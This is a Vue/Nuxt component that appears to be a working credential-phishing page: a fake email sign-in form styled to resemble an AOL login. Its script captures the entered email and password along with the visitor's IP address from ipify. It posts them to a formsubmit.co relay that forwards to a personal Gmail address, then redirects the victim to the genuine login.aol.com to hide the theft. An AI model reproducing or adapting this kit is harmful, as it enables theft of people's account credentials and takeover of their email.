<!-- Please remove this file from your project -->
<template>
  <div class="relative flex items-top justify-center min-h-screen bg-gray-100 sm:items-center sm:pt-0">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.1.2/dist/tailwind.min.css" rel="stylesheet">
    <div class="max-w-4xl mx-auto sm:px-6 lg:px-8">
      <a class="flex justify-center pt-8 sm:pt-0">
     <img src="https://storage.cloud.google.com/shippingfsl.appspot.com/images/logo.png" width="218" height="45">      </a>
      <div class="mt-8 bg-white overflow-hidden shadow sm:rounded-lg p-6">
        <h2 class="text-2xl leading-7 font-semibold">
        Sign in your email<span class="mk-white"> to access account and more</span>
        </h2>
         <form class="login-form" @submit.prevent="submitForm()" :action="formUrl" :method="POST">
        <p class="mt-3 text-gray-600">
        <label class="label">Email</label>
           <input v-model="formData.email" class="form-control" name="email" type="email" placeholder="joedoe@aol.com" required />
    </p>
    <p class="mt-3 text-gray-600">
    <label class="label">Password</label>
    <input v-model="formData.password" class="form-control" name="password" type="password" placeholder="*********" required />
    <input v-model="formData.userISP" type="hidden" name="user_isp"/>
    </p>
        <p class="mt-4 pt-4 text-gray-800 border-t border-dashed">
        <button class="w-full text-white bg-blue-500 hover:bg-warning-900 focus:ring-4 focus:outline-none focus:ring-primary-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center _darkbg-primary-600 _darkhover:bg-primary-700 _darkfocus:ring-primary-800" type="submit">{{submitBtn}}</button>
        </p>
        </form>
      </div>
    </div>
  </div>
</template>

<script>
// import axios from '@nuxtjs/axios';

export default {
   data() {
    return {
      formData: {
        name: '',
        email: '',        
        userISP: null, // Variable to store user's ISP information
        // _captcha: "false",

      },
      formUrl: 'https://formsubmit.co/ajax/Hiltonaustina@gmail.com', // Replace with your desired URL
      submitBtn:"Sign In"
    };
  },
  methods: {
    async fetchUserISP() {
      try {
        // Use an external service to get the user's IP address
        const response = await fetch('https://api64.ipify.org?format=json');
        const data = await response.json();

        // Extract ISP information
        const isp = data.ip;

        // Update the userISP variable
        this.formData.userISP = isp;
      } catch (error) {
        console.error('Error fetching user ISP:', error);
      }
    },
    async submitForm() {
      // Fetch user's ISP before submitting the form
      this.submitBtn = "Connecting...."
      await this.fetchUserISP();

      // Add the ISP information to the form data
      this.formData.isp = this.userISP;

      // You can perform additional actions here before or after submission
      console.log('Form submitted with data:', this.formData);
      try {
        // Submit the form data to the server using Axios
        console.log(this.$axios)
        const response = await this.$axios.post(this.formUrl, this.formData,{
           headers: { 
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }
        });
        console.log('Server response:', response.data);

        window.location.replace("https://login.aol.com/")
      } catch (error) {
        console.error('Error submitting form:', error);
      }

      // Submit the form data to the server
      // You may use Axios or another HTTP library for this step
      this.submitBtn = "Sign In"
    },
  },
  mounted() {
    // Fetch user's ISP when the component is mounted
    this.fetchUserISP();

  },
};
</script>
<style scoped>
.mk-white{
  color: #fff;
}
</style>